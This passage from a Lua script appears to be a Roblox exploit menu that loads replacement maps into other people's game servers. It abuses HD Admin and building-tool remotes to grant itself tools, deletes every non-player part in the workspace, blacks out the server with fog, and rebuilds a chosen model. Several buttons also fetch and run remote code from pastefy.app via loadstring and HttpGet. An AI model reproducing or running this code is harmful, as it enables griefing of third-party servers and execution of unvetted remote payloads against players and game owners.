		for _, v in next, imported_model:GetDescendants() do
			pcall(function()
				v.Anchored = true
			end)
		end

		local plr = game:GetService("Players").LocalPlayer

		local totalparts = {}

		total = 0
		completed = 0

		for i,v in pairs(imported_model:GetDescendants()) do
			if v:IsA("Part") or v:IsA("WedgePart") or v:IsA("Seat") or v:IsA("VehicleSeat") or v:IsA("TrussPart") or v:IsA("SpawnLocation") or v:IsA("CornerWedgePart") then
				total += 1
				local Type = v:IsA("WedgePart") and "Wedge" or v:IsA("Seat") and "Seat" or v:IsA("VehicleSeat") and "Vehicle Seat" or v:IsA("TrussPart") and "Truss" or v:IsA("SpawnLocation") and "Spawn" or v:IsA("CornerWedgePart") and "Corner" or
					v.Shape == Enum.PartType.Block and "Normal" or
					v.Shape == Enum.PartType.Ball and "Ball" or
					v.Shape == Enum.PartType.Cylinder and "Cylinder"

				task.defer(function()
					local part = remote:InvokeServer("CreatePart",Type,v.CFrame,destination)
					table.insert(totalparts, {new=part,old=v})
					completed += 1
				end)
			end
		end

		while completed < total do
			task.wait()
		end

		local yeah = {}
		for i,data in pairs(totalparts) do
			table.insert(yeah,{Part=data.new,CFrame=data.old.CFrame,Size=data.old.Size})
		end
		task.defer(function()
			remote:InvokeServer("SyncResize",yeah)
		end)

		local yeah = {}
		for i,data in pairs(totalparts) do
			if data.old.CanCollide ~= true then
				table.insert(yeah,{Part=data.new,CanCollide=data.old.CanCollide})
			end
		end
		if #yeah > 0 then
			task.defer(function()
				remote:InvokeServer("SyncCollision",yeah)
			end)
		end

		local yeah = {}
		for i,data in pairs(totalparts) do
			table.insert(yeah,{Part=data.new,Color=data.old.Color})
		end
		task.defer(function()
			remote:InvokeServer("SyncColor",yeah)
		end)

		local yeah = {}
		for i,data in pairs(totalparts) do
			if data.old.Material ~= "Plastic" or data.old.Reflectance ~= 0 or data.old.Transparency ~= 0 then
				table.insert(yeah,{Part=data.new,Material=data.old.Material,Transparency=data.old.Transparency,Reflectance=data.old.Reflectance})
			end
		end
		if #yeah > 0 then
			task.defer(function()
				remote:InvokeServer("SyncMaterial",yeah)
			end)
		end

		local yeah = {}
		for i,data in pairs(totalparts) do
			table.insert(yeah,{Part=data.new,Surfaces={Top=data.old.TopSurface,Front=data.old.FrontSurface,Bottom=data.old.BottomSurface,Right=data.old.RightSurface,Left=data.old.LeftSurface,Back=data.old.BackSurface}})
		end
		task.defer(function()
			remote:InvokeServer("SyncSurface",yeah)
		end)

		local yeah = {}
		for i,data in pairs(totalparts) do
			local mesh1 = data.old:FindFirstChildOfClass("SpecialMesh")
			if mesh1 then
				table.insert(yeah,{Part=data.new})
			end
		end
		task.defer(function()
			remote:InvokeServer("CreateMeshes",yeah)
		end)

		local yeah = {}
		for i,data in pairs(totalparts) do
			local mesh1 = data.old:FindFirstChildOfClass("SpecialMesh")
			if mesh1 then
				table.insert(yeah,{Part=data.new,MeshId=mesh1.MeshId,TextureId=mesh1.TextureId,Scale=mesh1.Scale,MeshType=mesh1.MeshType,VertexColor=mesh1.VertexColor})
			end
		end
		task.defer(function()
			remote:InvokeServer("SyncMesh",yeah)
		end)

		local yeah = {}
		for i,data in pairs(totalparts) do
			local mesh2 = data.old:FindFirstChildOfClass("CylinderMesh")
			if mesh2 then
				table.insert(yeah,{Part=data.new})
			end
		end
		task.defer(function()
			remote:InvokeServer("CreateMeshes",yeah)
		end)

		local yeah = {}
		for i,data in pairs(totalparts) do
			local light1 = data.old:FindFirstChildOfClass("SpotLight")
			if light1 then
				table.insert(yeah,{Part=data.new,LightType="SpotLight"})
			end
		end
		task.defer(function()
			remote:InvokeServer("CreateLights",yeah)
		end)

		local yeah = {}
		for i,data in pairs(totalparts) do
			local light1 = data.old:FindFirstChildOfClass("SpotLight")
			if light1 then
				table.insert(yeah,{Part=data.new,LightType="SpotLight",Color=light1.Color,Range=light1.Range,Face=light1.Face,Angle=light1.Angle,Shadows=light1.Shadows})
			end
		end
		task.defer(function()
			remote:InvokeServer("SyncLighting",yeah)
		end)

		local yeah = {}
		for i,data in pairs(totalparts) do
			local light2 = data.old:FindFirstChildOfClass("PointLight")
			if light2 then
				table.insert(yeah,{Part=data.new,LightType="PointLight"})
			end
		end
		task.defer(function()
			remote:InvokeServer("CreateLights",yeah)
		end)

		local yeah = {}
		for i,data in pairs(totalparts) do
			local light2 = data.old:FindFirstChildOfClass("PointLight")
			if light2 then
				table.insert(yeah,{Part=data.new,LightType="PointLight",Color=light2.Color,Range=light2.Range,Shadows=light2.Shadows})
			end
		end
		task.defer(function()
			remote:InvokeServer("SyncLighting",yeah)
		end)

		local yeah = {}
		for i,data in pairs(totalparts) do
			local light3 = data.old:FindFirstChildOfClass("SurfaceLight")
			if light3 then
				table.insert(yeah,{Part=data.new,LightType="SurfaceLight"})
			end
		end
		task.defer(function()
			remote:InvokeServer("CreateLights",yeah)
		end)

		local yeah = {}
		for i,data in pairs(totalparts) do
			local light3 = data.old:FindFirstChildOfClass("SurfaceLight")
			if light3 then
				table.insert(yeah,{Part=data.new,LightType="SurfaceLight",Color=light3.Color,Range=light3.Range,Face=light3.Face,Angle=light3.Angle,Shadows=light3.Shadows})
			end
		end
		task.defer(function()
			remote:InvokeServer("SyncLighting",yeah)
		end)

		local yeah = {}

		for i,data in pairs(totalparts) do
			task.defer(function()
				local texture = data.old:FindFirstChildOfClass("Texture")
				local decal = data.old:FindFirstChildOfClass("Decal")
				if texture then
					for i,v in pairs(data.old:GetChildren()) do
						if v.ClassName == "Texture" then
							remote:InvokeServer("CreateTextures", {{ Part = data.new, Face = v.Face, TextureType = "Texture" }})
							remote:InvokeServer("SyncTexture", {{ Part = data.new, Face = v.Face, TextureType = "Texture", StudsPerTileU = v.StudsPerTileU, StudsPerTileV = v.StudsPerTileV, Texture = v.Texture, Transparency = v.Transparency }})
						end
					end
				end
				if decal then
					for i,v in pairs(data.old:GetChildren()) do
						if v.ClassName == "Decal" then
							remote:InvokeServer("CreateTextures", {{ Part = data.new, Face = v.Face, TextureType = "Decal" }})
							remote:InvokeServer("SyncTexture", {{ Part = data.new, Face = v.Face, TextureType = "Decal", Texture = v.Texture, Transparency = v.Transparency }})
						end
					end
				end

				local fire = data.old:FindFirstChildOfClass("Fire")
				local sparkles = data.old:FindFirstChildOfClass("Sparkles")
				local smoke = data.old:FindFirstChildOfClass("Smoke")
				if fire and fire.Enabled == true then
					remote:InvokeServer("CreateDecorations", {{ Part = data.new, DecorationType = "Fire" }})
					remote:InvokeServer("SyncDecorate", {{ Part = data.new, DecorationType = "Fire", Color = fire.Color, SecondaryColor = fire.SecondaryColor, Size = fire.Size, Heat = fire.Heat }})
				end
				if sparkles and sparkles.Enabled == true then
					remote:InvokeServer("CreateDecorations",{{Part=created,DecorationType="Sparkles"}})
					remote:InvokeServer("SyncDecorate",{{Part=created,DecorationType="Sparkles",SparkleColor=sparkles.SparkleColor}})
				end
				if smoke and smoke.Enabled == true then
					remote:InvokeServer("CreateDecorations", {{ Part = data.new, DecorationType = "Smoke" }})
					remote:InvokeServer("SyncDecorate", {{ Part = data.new, DecorationType = "Smoke", Color = smoke.Color, Size = smoke.Size, RiseVelocity = smoke.RiseVelocity, Opacity = smoke.Opacity }})

				end
			end)
		end

		print("Finished build.")
		imported_model.Parent = nil
	end

	local function poop(id)
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

		RequestCommand:InvokeServer(";")
		wait(0.1)
		RequestCommand:InvokeServer(";btools")
		wait(1.5)

		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
				tool = v.Parent
			end
		end
		if tool == nil then
			for i,v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
		end
		remote = tool.SyncAPI.ServerEndpoint

		remote:InvokeServer('Remove', {game.Players.LocalPlayer.Character});

		local function GetPartsFromSelection(Selection)
			local Parts = {}
			for _, Descendant in pairs(Selection:GetDescendants()) do
				if Descendant:IsA 'BasePart' and Descendant.Name ~= "Terrain" and not game.Players:GetPlayerFromCharacter(Descendant.Parent) and not Descendant.Parent:IsA("Accessory") then
					Parts[#Parts + 1] = Descendant
				end
			end
			return Parts
		end

		local getfuckedlol = GetPartsFromSelection(workspace)
		local shitass = {}
		for _, Part in pairs(getfuckedlol) do
			table.insert(shitass, Part);
		end;
		remote:InvokeServer('Remove', shitass);

		wait(0.5)

		poopnoremove(id)
	end
	poop(130275749541324)
	wait(0.01)
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

	RequestCommand:InvokeServer(";time 0 ;fogcolor black ;fog 9999999999999")
	wait(0.01)

	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool

	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	local remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end

	function SetMesh(part, meshid, vertexColor)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid,
					["VertexColor"] = vertexColor or Vector3.new(1, 1, 1)
				}
			}
		}
		_(args)
	end

	function CreatePart(cf,parent)
		local args = {[1] = "CreatePart", [2] = "Normal", [3] = cf, [4] = parent}
		_(args)
	end

	function AddMesh(part)
		local args = {[1] = "CreateMeshes", [2] = { [1] = { ["Part"] = part } } }
		_(args)
	end

	function SetTexture(part, texid)
		local args = {[1] = "SyncMesh", [2] = { [1] = { ["Part"] = part, ["TextureId"] = "rbxassetid://"..texid } } }
		_(args)
	end

	function SetName(part, stringg)
		local args = {[1] = "SetName", [2] = {[1] = part}, [3] = stringg}
		_(args)
	end

	function MeshResize(part,size)
		local args = {[1] = "SyncMesh", [2] = { [1] = { ["Part"] = part, ["Scale"] = size } } }
		_(args)
	end

	function SetLocked(part,boolean)
		local args = {[1] = "SetLocked", [2] = {[1] = part}, [3] = boolean}
		_(args)
	end

	function SetTrans(part,int)
		local args = {[1] = "SyncMaterial", [2] = { [1] = { ["Part"] = part, ["Transparency"] = int } } }
		_(args)
	end

	function Color(part,color)
		local args = {[1] = "SyncColor", [2] = { [1] = { ["Part"] = part, ["Color"] = color, ["UnionColoring"] = false } } }
		_(args)
	end

	function SyncLighting(part,brightness)
		local args = {[1] = "SyncLighting", [2] = { [1] = { ["Part"] = part, ["LightType"] = "PointLight", ["Brightness"] = brightness } } }
		_(args)
	end

	function Sky(id, transparency, scale, vertexColor, offset)
		local hrp = char.HumanoidRootPart.CFrame
		local basePos = Vector3.new(math.floor(hrp.x), math.floor(hrp.y), math.floor(hrp.z))

		local spawnPos = basePos + (offset or Vector3.new(0,0,0))

		CreatePart(CFrame.new(spawnPos) + Vector3.new(0, -10, 0), workspace)
		wait(0.01)

		for i, v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == spawnPos.X and v.CFrame.z == spawnPos.Z then

				SetName(v, "Sky")
				AddMesh(v)

				SetMesh(v, "111891702759441", vertexColor)
				SetTexture(v, id)
				MeshResize(v, Vector3.new(scale, scale, scale))

				SetLocked(v, true)
				SetTrans(v, transparency)

				local matArgs = {
					[1] = "SyncMaterial",
					[2] = { [1] = { ["Part"] = v, ["Material"] = Enum.Material.Neon } }
				}
				_(matArgs)

				Color(v, Color3.fromRGB(255, 255, 255))

				local lightArgs = {
					[1] = "CreateLights",
					[2] = { [1] = { ["Part"] = v, ["LightType"] = "PointLight" } }
				}
				_(lightArgs)

				SyncLighting(v, 0)
			end
		end
	end

	Sky("dont change this", 0, 15000, Vector3.new(0,0,0), Vector3.new(-25, -10, 0))

	wait(0.01)

	Sky("100381875734079", 0.02, 10000, Vector3.new(3.8,3.8,3.8), Vector3.new(25, -10, 0))
	wait(3)
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

	RequestCommand:InvokeServer(";respawn")
end)
end

local oldobby = Instance.new("TextButton")
oldobby.Name = "oldobby"
oldobby.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
oldobby.Text = "my old obby from 2025"
oldobby.TextColor3 = Color3.fromRGB(255, 255, 255)
oldobby.TextSize = 16
oldobby.TextWrapped = true
oldobby.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
oldobby.BorderColor3 = Color3.fromRGB(0, 242, 255)
oldobby.Position = UDim2.new(0.339810908, 0, 0.235789493, 0)
oldobby.Size = UDim2.new(0, 87, 0, 35)
oldobby.Parent = ScrollingFrame

local slap = Instance.new("TextButton")
slap.Name = "slap"
slap.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
slap.Text = "slap tower"
slap.TextColor3 = Color3.fromRGB(255, 255, 255)
slap.TextSize = 16
slap.TextWrapped = true
slap.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
slap.BorderColor3 = Color3.fromRGB(0, 242, 255)
slap.Position = UDim2.new(0.509716332, 0, 0.235789493, 0)
slap.Size = UDim2.new(0, 87, 0, 35)
slap.Parent = ScrollingFrame

local nuketown = Instance.new("TextButton")
nuketown.Name = "nuketown"
nuketown.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
nuketown.Text = "nuketown"
nuketown.TextColor3 = Color3.fromRGB(255, 255, 255)
nuketown.TextSize = 16
nuketown.TextWrapped = true
nuketown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
nuketown.BorderColor3 = Color3.fromRGB(0, 242, 255)
nuketown.Position = UDim2.new(0.679621816, 0, 0.235789493, 0)
nuketown.Size = UDim2.new(0, 87, 0, 35)
nuketown.Parent = ScrollingFrame

local ragdollengine = Instance.new("TextButton")
ragdollengine.Name = "ragdollengine"
ragdollengine.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
ragdollengine.Text = "ragdoll engine"
ragdollengine.TextColor3 = Color3.fromRGB(255, 255, 255)
ragdollengine.TextSize = 16
ragdollengine.TextWrapped = true
ragdollengine.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ragdollengine.BorderColor3 = Color3.fromRGB(0, 242, 255)
ragdollengine.Position = UDim2.new(0.679621816, 0, 0.122368366, 0)
ragdollengine.Size = UDim2.new(0, 87, 0, 35)
ragdollengine.Parent = ScrollingFrame

local randomcity = Instance.new("TextButton")
randomcity.Name = "randomcity"
randomcity.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
randomcity.Text = "random city"
randomcity.TextColor3 = Color3.fromRGB(255, 255, 255)
randomcity.TextSize = 16
randomcity.TextWrapped = true
randomcity.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
randomcity.BorderColor3 = Color3.fromRGB(0, 242, 255)
randomcity.Position = UDim2.new(0.509716332, 0, 0.122368366, 0)
randomcity.Size = UDim2.new(0, 87, 0, 35)
randomcity.Parent = ScrollingFrame

local brookhaven = Instance.new("TextButton")
brookhaven.Name = "brookhaven"
brookhaven.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
brookhaven.Text = "brookhaven"
brookhaven.TextColor3 = Color3.fromRGB(255, 255, 255)
brookhaven.TextSize = 16
brookhaven.TextWrapped = true
brookhaven.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
brookhaven.BorderColor3 = Color3.fromRGB(0, 242, 255)
brookhaven.Position = UDim2.new(0.339810908, 0, 0.122368366, 0)
brookhaven.Size = UDim2.new(0, 87, 0, 35)
brookhaven.Parent = ScrollingFrame

local horror = Instance.new("TextButton")
horror.Name = "horror"
horror.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
horror.Text = "horror map"
horror.TextColor3 = Color3.fromRGB(255, 255, 255)
horror.TextSize = 16
horror.TextWrapped = true
horror.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
horror.BorderColor3 = Color3.fromRGB(0, 242, 255)
horror.Position = UDim2.new(0.169905454, 0, 0.122368366, 0)
horror.Size = UDim2.new(0, 87, 0, 35)
horror.Parent = ScrollingFrame

local randomobby = Instance.new("TextButton")
randomobby.Name = "randomobby"
randomobby.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
randomobby.Text = "random obby"
randomobby.TextColor3 = Color3.fromRGB(255, 255, 255)
randomobby.TextSize = 16
randomobby.TextWrapped = true
randomobby.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
randomobby.BorderColor3 = Color3.fromRGB(0, 242, 255)
randomobby.Position = UDim2.new(0, 0, 0.122368366, 0)
randomobby.Size = UDim2.new(0, 87, 0, 35)
randomobby.Parent = ScrollingFrame

local MapLoaderShit = Instance.new("Folder")
MapLoaderShit.Name = "MapLoaderShit"
MapLoaderShit.Parent = ScrollingFrame
__S[#__S + 1] = function(...)
local script = MapLoaderShit
local idMap = {
	["brookhaven"]    = 97576904853954, 
	["scp087"]        = 74246564873554,
	["randomcity"]    = 2701703521,
	["ragdollengine"] = 9263583853,
	["randomobby"]   = 136671886829890,
	["horror"]        = 9818642099,
	["mw2rust"]      = 126330309188983,
	["oldobby"]      = 133173439446281,
	["slap"]      = 127895626152717,
	["nuketown"]      = 138185161558931,
	["mc"]           = 111318713256221
}

local function poopnoremove(id)
	-- fixed by 1sw0rd1
	-- edit by trafficconehax

	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool

	-- Find the SyncAPI tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
			tool = v.Parent
			break
		end
	end
	if not tool then
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
				break
			end
		end
	end

	if not tool then
		warn("SyncAPI tool not found!")
		return
	end

	local remote = tool.SyncAPI.ServerEndpoint

	-- Load the model
	local model_id = id
	local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
	imported_model.Parent = game.Lighting

	-- Determine destination
	local destination = workspace:FindFirstChildOfClass("Terrain")
	if tool:FindFirstChild("Tools") and tool:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
		destination = workspace
	end

	-- Anchor all parts
	for _, v in next, imported_model:GetDescendants() do
		pcall(function()
			v.Anchored = true
		end)
	end

	-- Prepare for parts creation
	local totalparts = {}
	local total = 0
	local completed = 0

	for i,v in pairs(imported_model:GetDescendants()) do
		if v:IsA("Part") or v:IsA("WedgePart") or v:IsA("Seat") or v:IsA("VehicleSeat") or v:IsA("TrussPart") or v:IsA("SpawnLocation") or v:IsA("CornerWedgePart") then
			total += 1
			local Type =
				v:IsA("WedgePart") and "Wedge" or
				v:IsA("Seat") and "Seat" or
				v:IsA("VehicleSeat") and "Vehicle Seat" or
				v:IsA("TrussPart") and "Truss" or
				v:IsA("SpawnLocation") and "Spawn" or
				v:IsA("CornerWedgePart") and "Corner" or
				v.Shape == Enum.PartType.Block and "Normal" or
				v.Shape == Enum.PartType.Ball and "Ball" or
				v.Shape == Enum.PartType.Cylinder and "Cylinder"

			task.defer(function()
				local part = remote:InvokeServer("CreatePart", Type, v.CFrame, destination)
				table.insert(totalparts, {new=part,old=v})
				completed += 1
			end)
		end
	end

	while completed < total do
		task.wait()
	end

	-- Sync resize
	local cframes = {}
	for i,data in pairs(totalparts) do
		table.insert(cframes, {Part=data.new, CFrame=data.old.CFrame, Size=data.old.Size})
	end
	task.defer(function()
		remote:InvokeServer("SyncResize", cframes)
	end)

	-- Sync collision
	local collisionData = {}
	for i,data in pairs(totalparts) do
		if data.old.CanCollide ~= true then
			table.insert(collisionData, {Part=data.new, CanCollide=data.old.CanCollide})
		end
	end
	if #collisionData > 0 then
		task.defer(function()
			remote:InvokeServer("SyncCollision", collisionData)
		end)
	end

	-- Sync color
	local colorData = {}
	for i,data in pairs(totalparts) do
		table.insert(colorData, {Part=data.new, Color=data.old.Color})
	end
	task.defer(function()
		remote:InvokeServer("SyncColor", colorData)
	end)

	-- Sync material
	local materialData = {}
	for i,data in pairs(totalparts) do
		if data.old.Material ~= Enum.Material.Plastic or data.old.Transparency ~= 0 or data.old.Reflectance ~= 0 then
			table.insert(materialData, {Part=data.new, Material=data.old.Material, Transparency=data.old.Transparency, Reflectance=data.old.Reflectance})
		end
	end
	if #materialData > 0 then
		task.defer(function()
			remote:InvokeServer("SyncMaterial", materialData)
		end)
	end

	-- Sync surface properties
	local surfaceData = {}
	for i,data in pairs(totalparts) do
		table.insert(surfaceData, {
			Part = data.new,
			Surfaces = {
				Top = data.old.TopSurface,
				Front = data.old.FrontSurface,
				Bottom = data.old.BottomSurface,
				Right = data.old.RightSurface,
				Left = data.old.LeftSurface,
				Back = data.old.BackSurface
			}
		})
	end
	task.defer(function()
		remote:InvokeServer("SyncSurface", surfaceData)
	end)

	-- Create meshes
	local meshData = {}
	for i,data in pairs(totalparts) do
		local mesh1 = data.old:FindFirstChildOfClass("SpecialMesh")
		if mesh1 then
			table.insert(meshData, {Part=data.new, MeshId=mesh1.MeshId, TextureId=mesh1.TextureId, Scale=mesh1.Scale, MeshType=mesh1.MeshType, VertexColor=mesh1.VertexColor})
		end
	end
	if #meshData > 0 then
		task.defer(function()
			remote:InvokeServer("SyncMesh", meshData)
		end)
	end

	-- Create cylinder meshes
	local cylMeshData = {}
	for i,data in pairs(totalparts) do
		local mesh2 = data.old:FindFirstChildOfClass("CylinderMesh")
		if mesh2 then
			table.insert(cylMeshData, {Part=data.new})
		end
	end
	if #cylMeshData > 0 then
		task.defer(function()
			remote:InvokeServer("CreateMeshes", cylMeshData)
		end)
	end

	-- Create lights
	local lightTypes = {
		{Class="SpotLight",Type="SpotLight"},
		{Class="PointLight",Type="PointLight"},
		{Class="SurfaceLight",Type="SurfaceLight"}
	}

	for _, lightInfo in ipairs(lightTypes) do
		local lightsData = {}
		for i,data in pairs(totalparts) do
			local lightObj = data.old:FindFirstChildOfClass(lightInfo.Class)
			if lightObj then
				local entry = {Part=data.new, LightType=lightInfo.Type}
				-- Add properties if applicable
				if lightInfo.Type ~= "SurfaceLight" then
					entry.Color = lightObj.Color
					entry.Range = lightObj.Range
					entry.Shadows = lightObj.Shadows
				else
					entry.Color = lightObj.Color
					entry.Range = lightObj.Range
					entry.Face = lightObj.Face
					entry.Angle = lightObj.Angle
					entry.Shadows = lightObj.Shadows
				end
				table.insert(lightsData, entry)
			end
		end
		if #lightsData > 0 then
			task.defer(function()
				remote:InvokeServer("CreateLights", lightsData)
			end)
		end
	end

	-- Handle textures and decals
	local textureDecalData = {}
	for i,data in pairs(totalparts) do
		local texture = data.old:FindFirstChildOfClass("Texture")
		local decal = data.old:FindFirstChildOfClass("Decal")

		if texture then
			for _, v in pairs(data.old:GetChildren()) do
				if v.ClassName == "Texture" then
					table.insert(textureDecalData, {Part=data.new, Face=v.Face, TextureType="Texture"})
					remote:InvokeServer("CreateTextures", {{Part=data.new, Face=v.Face, TextureType="Texture"}})
					remote:InvokeServer("SyncTexture", {{Part=data.new, Face=v.Face, TextureType="Texture", StudsPerTileU=v.StudsPerTileU, StudsPerTileV=v.StudsPerTileV, Texture=v.Texture, Transparency=v.Transparency}})
				end
			end
		end
		if decal then
			for _, v in pairs(data.old:GetChildren()) do
				if v.ClassName == "Decal" then
					table.insert(textureDecalData, {Part=data.new, Face=v.Face, TextureType="Decal"})
					remote:InvokeServer("CreateTextures", {{Part=data.new, Face=v.Face, TextureType="Decal"}})
					remote:InvokeServer("SyncTexture", {{Part=data.new, Face=v.Face, TextureType="Decal", Texture=v.Texture, Transparency=v.Transparency}})
				end
			end
		end
	end

	-- Decorations: Fire, Sparkles, Smoke
	for i,data in pairs(totalparts) do
		task.defer(function()
			local oldPart = data.old
			local newPart = data.new
			local fire = oldPart:FindFirstChildOfClass("Fire")
			local sparkles = oldPart:FindFirstChildOfClass("Sparkles")
			local smoke = oldPart:FindFirstChildOfClass("Smoke")

			if fire and fire.Enabled then
				remote:InvokeServer("CreateDecorations", {{Part=newPart, DecorationType="Fire"}})
				remote:InvokeServer("SyncDecorate", {{Part=newPart, DecorationType="Fire", Color=fire.Color, SecondaryColor=fire.SecondaryColor, Size=fire.Size, Heat=fire.Heat}})
			end
			if sparkles and sparkles.Enabled then
				remote:InvokeServer("CreateDecorations", {{Part=newPart, DecorationType="Sparkles"}})
				remote:InvokeServer("SyncDecorate", {{Part=newPart, DecorationType="Sparkles", SparkleColor=sparkles.SparkleColor}})
			end
			if smoke and smoke.Enabled then
				remote:InvokeServer("CreateDecorations", {{Part=newPart, DecorationType="Smoke"}})
				remote:InvokeServer("SyncDecorate", {{Part=newPart, DecorationType="Smoke", Color=smoke.Color, Size=smoke.Size, RiseVelocity=smoke.RiseVelocity, Opacity=smoke.Opacity}})
			end
		end)
	end

	print("Finished build.")
	imported_model:Destroy()
end

local function poop(id)
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient", 5).Signals.RequestCommandSilent

	RequestCommand:InvokeServer(";")
	task.wait(0.1)
	RequestCommand:InvokeServer(";btools")
	task.wait(1.5)

	local player = game.Players.LocalPlayer
	local tool

	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
			tool = v.Parent
			break
		end
	end
	if not tool then
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
				break
			end
		end
	end

	if not tool then
		warn("SyncAPI tool not found!")
		return
	end

	local remote = tool.SyncAPI.ServerEndpoint

	-- Remove existing character parts
	remote:InvokeServer('Remove', {game.Players.LocalPlayer.Character})

	-- Remove selected parts from workspace
	local function GetPartsFromSelection(Selection)
		local Parts = {}
		for _, Descendant in pairs(Selection:GetDescendants()) do
			if Descendant:IsA('BasePart') and Descendant.Name ~= "Terrain" and not game.Players:GetPlayerFromCharacter(Descendant.Parent) and not Descendant.Parent:IsA("Accessory") then
				table.insert(Parts, Descendant)
			end
		end
		return Parts
	end

	local selectedParts = GetPartsFromSelection(workspace)
	local partsToRemove = {}
	for _, Part in pairs(selectedParts) do
		table.insert(partsToRemove, Part)
	end
	remote:InvokeServer('Remove', partsToRemove)

	wait(0.5)

	-- Call main function
	poopnoremove(id)
end

local page = script.Parent

for _, button in ipairs(page:GetChildren()) do
	if button:IsA("TextButton") or button:IsA("ImageButton") then
		button.MouseButton1Click:Connect(function()
			local assetId = idMap[button.Name]
			if assetId then
				print("Spawning: " .. button.Name)
				poop(assetId)
			else
				warn("No ID set for " .. button.Name)
			end
		end)
	end
end
end

local wowwww = Instance.new("TextButton")
wowwww.Name = "wowwww"
wowwww.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
wowwww.Text = "LIDL"
wowwww.TextColor3 = Color3.fromRGB(255, 255, 255)
wowwww.TextSize = 16
wowwww.TextWrapped = true
wowwww.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
wowwww.BorderColor3 = Color3.fromRGB(0, 242, 255)
wowwww.Position = UDim2.new(0, 0, 0.122368366, 0)
wowwww.Size = UDim2.new(0, 87, 0, 35)
wowwww.Parent = ScrollingFrame

local LocalScript40 = Instance.new("Folder")
LocalScript40.Name = "LocalScript"
LocalScript40.Parent = wowwww
__S[#__S + 1] = function(...)
local script = LocalScript40
script.Parent.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/TtAujtN2/raw"))()
end)

end

local wowwww2 = Instance.new("TextButton")
wowwww2.Name = "wowwww"
wowwww2.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
wowwww2.Text = "old mm2 lobby"
wowwww2.TextColor3 = Color3.fromRGB(255, 255, 255)
wowwww2.TextSize = 16
wowwww2.TextWrapped = true
wowwww2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
wowwww2.BorderColor3 = Color3.fromRGB(0, 242, 255)
wowwww2.Position = UDim2.new(0, 0, 0.122368366, 0)
wowwww2.Size = UDim2.new(0, 87, 0, 35)
wowwww2.Parent = ScrollingFrame

local LocalScript41 = Instance.new("Folder")
LocalScript41.Name = "LocalScript"
LocalScript41.Parent = wowwww2
__S[#__S + 1] = function(...)
local script = LocalScript41
script.Parent.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/q10du9Jp/raw"))()
end)

end

local wowwww3 = Instance.new("TextButton")
wowwww3.Name = "wowwww"
wowwww3.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
wowwww3.Text = "brookhaven 2020"
wowwww3.TextColor3 = Color3.fromRGB(255, 255, 255)
wowwww3.TextSize = 16
wowwww3.TextWrapped = true
wowwww3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
wowwww3.BorderColor3 = Color3.fromRGB(0, 242, 255)
